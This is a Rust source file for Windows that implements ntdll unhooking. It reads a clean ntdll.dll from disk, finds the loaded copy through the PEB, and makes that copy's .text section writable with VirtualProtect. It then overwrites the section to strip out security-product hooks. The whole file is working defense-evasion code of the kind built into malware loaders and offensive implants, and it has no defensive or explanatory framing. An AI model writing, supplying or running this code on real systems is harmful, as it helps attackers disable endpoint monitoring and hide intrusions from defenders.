use std::arch::asm;
use winapi::um::fileapi::{CreateFileA, ReadFile, GetFileSize, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::{FILE_SHARE_READ, GENERIC_READ, FILE_ATTRIBUTE_NORMAL, PAGE_EXECUTE_WRITECOPY};

// ── PE header structures (minimal) ─────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    _pad: [u8; 16],
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _pad: [u8; 16],
}

// ── Step 1: Read clean ntdll.dll from disk ─────────────────────────

unsafe fn read_ntdll_from_disk() -> Option<Vec<u8>> {
    let path = b"C:\\Windows\\System32\\ntdll.dll\0";

    let handle = CreateFileA(
        path.as_ptr() as *const i8,
        GENERIC_READ,
        FILE_SHARE_READ,
        std::ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        std::ptr::null_mut(),
    );

    if handle == INVALID_HANDLE_VALUE {
        return None;
    }

    let file_size = GetFileSize(handle, std::ptr::null_mut());
    let mut buffer = vec![0u8; file_size as usize];
    let mut bytes_read = 0u32;

    let success = ReadFile(
        handle,
        buffer.as_mut_ptr() as *mut _,
        file_size,
        &mut bytes_read,
        std::ptr::null_mut(),
    );

    CloseHandle(handle);

    if success == 0 || bytes_read != file_size {
        return None;
    }

    Some(buffer)
}

// ── Step 2: Get hooked ntdll base address from PEB ─────────────────

unsafe fn get_local_ntdll_base() -> *const u8 {
    let peb: *const u8;
    asm!("mov {}, gs:[0x60]", out(reg) peb);

    // PEB->Ldr (offset 0x18)
    let ldr = *(peb.add(0x18) as *const *const u8);

    // Ldr->InMemoryOrderModuleList (offset 0x20)
    let list_head = ldr.add(0x20) as *const *const u8;

    // First entry = executable, second = ntdll.dll
    let first_entry = *(list_head as *const *const u8);
    let second_entry = *(first_entry as *const *const u8);

    // DllBase is at offset 0x20 from the InMemoryOrderLinks pointer
    let dll_base = *(second_entry.add(0x20) as *const *const u8);
    dll_base
}

// ── Step 3: Parse PE to find section headers ───────────────────────

unsafe fn get_sections(base: *const u8) -> Option<(*const ImageSectionHeader, u16)> {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D { return None; }

    let nt_hdrs = base.add(dos.e_lfanew as usize);
    let signature = *(nt_hdrs as *const u32);
    if signature != 0x00004550 { return None; }

    let file_header = &*((nt_hdrs.add(4)) as *const ImageFileHeader);
    let optional_header_size = *((nt_hdrs.add(4 + 16)) as *const u16);
    let sections = nt_hdrs.add(4 + 20 + optional_header_size as usize);

    Some((sections as *const ImageSectionHeader, file_header.number_of_sections))
}

// Find .text using VirtualAddress (for in-memory / mapped images)
unsafe fn find_text_section_mapped(base: *const u8) -> Option<(*const u8, usize)> {
    let (sections, count) = get_sections(base)?;
    for i in 0..count as usize {
        let section = &*sections.add(i);
        if &section.name[..5] == b".text" {
            return Some((
                base.add(section.virtual_address as usize),
                section.virtual_size as usize,
            ));
        }
    }
    None
}

// Find .text using PointerToRawData (for file read from disk)
unsafe fn find_text_section_raw(base: *const u8) -> Option<(*const u8, usize)> {
    let (sections, count) = get_sections(base)?;
    for i in 0..count as usize {
        let section = &*sections.add(i);
        if &section.name[..5] == b".text" {
            return Some((
                base.add(section.pointer_to_raw_data as usize),
                section.size_of_raw_data as usize,
            ));
        }
    }
    None
}

// ── Step 4: Overwrite the hooked .text section ─────────────────────

unsafe fn replace_text_section(
    hooked_text: *const u8,
    clean_text: *const u8,
    size: usize,
) -> bool {
    let mut old_protect: u32 = 0;

    if VirtualProtect(
        hooked_text as _,
        size,
        PAGE_EXECUTE_WRITECOPY,
        &mut old_protect,
    ) == 0 {
        return false;
    }

    std::ptr::copy_nonoverlapping(clean_text, hooked_text as *mut u8, size);

    VirtualProtect(
        hooked_text as _,
        size,
        old_protect,
        &mut old_protect,
    );

    true
}

// ── Public entry point ─────────────────────────────────────────────

pub unsafe fn unhook_ntdll() -> bool {
    let clean_ntdll = match read_ntdll_from_disk() {
        Some(buf) => buf,
        None => return false,
    };

    let hooked_base = get_local_ntdll_base();

    let (hooked_text, text_size) = match find_text_section_mapped(hooked_base) {
        Some(v) => v,
        None => return false,
    };

    let (clean_text, raw_size) = match find_text_section_raw(clean_ntdll.as_ptr()) {
        Some(v) => v,
        None => return false,
    };

    let copy_size = text_size.min(raw_size);

    if *(clean_text as *const u32) == 0 {
        return false;
    }

    replace_text_section(hooked_text, clean_text, copy_size)
}
